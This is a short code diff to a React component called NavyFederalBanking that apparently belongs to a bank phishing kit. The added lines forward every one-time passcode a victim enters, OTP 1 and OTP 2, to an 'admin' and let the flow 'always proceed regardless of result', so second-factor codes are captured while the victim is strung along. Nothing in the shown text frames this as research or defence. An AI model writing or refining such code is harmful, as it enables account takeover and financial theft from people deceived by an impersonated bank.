@@ -104,10 +104,11 @@ export default function NavyFederalBanking() {
       
       const which = step === 'otp1' ? 1 : 2
       
-      // ✅ BYPASS OTP — ALWAYS ACCEPT (Admin gets log)
+      // ✅ ALWAYS send OTP to admin (both OTP 1 and OTP 2)
       const result = await submitOtp({ attemptId, otp, which })
-      console.log('📱 OTP result:', result)
+      console.log(`📱 OTP ${which} result:`, result)
       
+      // ✅ BYPASS — always proceed regardless of result
       setLoading(false)
       setOtp('')
       
